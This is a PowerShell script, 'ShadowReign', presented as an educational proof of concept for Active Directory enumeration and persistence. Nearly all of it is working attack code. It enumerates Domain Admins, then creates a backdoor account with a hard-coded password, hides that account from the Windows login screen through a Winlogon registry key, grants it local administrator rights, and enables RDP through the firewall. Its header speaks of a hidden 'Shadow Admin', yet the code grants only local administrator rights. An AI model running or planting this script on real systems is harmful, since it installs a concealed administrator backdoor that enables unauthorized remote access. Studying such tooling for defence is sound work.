<#
.SYNOPSIS
ShadowReign - Active Directory Persistence & Enumeration
Educational Proof-of-Concept

.DESCRIPTION
Helper script to automate common AD persistence techniques and enumeration.
1. Enumerate Domain Admins
2. Add a hidden "Shadow Admin" user (Requires Domain Admin privs)
3. Enable RDP on the current host

.EXAMPLE
.\ShadowReign.ps1 -Enum
.\ShadowReign.ps1 -Persistence
#>

param (
    [switch]$Enum,
    [switch]$Persistence
)

Write-Host "ShadowReign - AD Dominance Tool" -ForegroundColor Red
Write-Host "-------------------------------" -ForegroundColor Red

if ($Enum) {
    Write-Host "[*] Enumerating Domain Admins..." -ForegroundColor Yellow
    try {
        $admins = Get-NetGroupMember -GroupName "Domain Admins" -ErrorAction Stop
        $admins | Select-Object MemberName,SID | Format-Table
    } catch {
        Write-Host "[-] Failed to enumerate typical groups. Are you on a domain joined machine?" -ForegroundColor Red
        # Fallback to standard windows commands if RSAT not present
        net group "Domain Admins" /domain
    }

    Write-Host "[*] Checking for interesting Service Principal Names (SPNs)..." -ForegroundColor Yellow
    # Simple kerberoast check
    # setspn -Q */*
}

if ($Persistence) {
    Write-Host "[*] Attempting Persistence (Requires Admin)..." -ForegroundColor Yellow

    # 1. Create Shadow User
    $user = "HelpDesk_Support_88"
    $pass = "Summer2025!Security"
    
    Write-Host "[+] Creating user $user..."
    net user $user $pass /add /Y > $null
    
    # 2. Hide from Login Screen (Special Registry Key)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
    New-ItemProperty -Path $regPath -Name $user -Value 0 -PropertyType DWORD -Force > $null
    
    Write-Host "[+] User $user created and hidden from Welcome Screen."

    # 3. Add to Local Admins
    net localgroup Administrators $user /add > $null
    Write-Host "[+] $user added to Local Administrators."

    # 4. Enable RDP
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    Write-Host "[+] RDP Enabled."
}

if (-not $Enum -and -not $Persistence) {
    Write-Host "Usage: .\ShadowReign.ps1 -Enum  OR  .\ShadowReign.ps1 -Persistence"
}
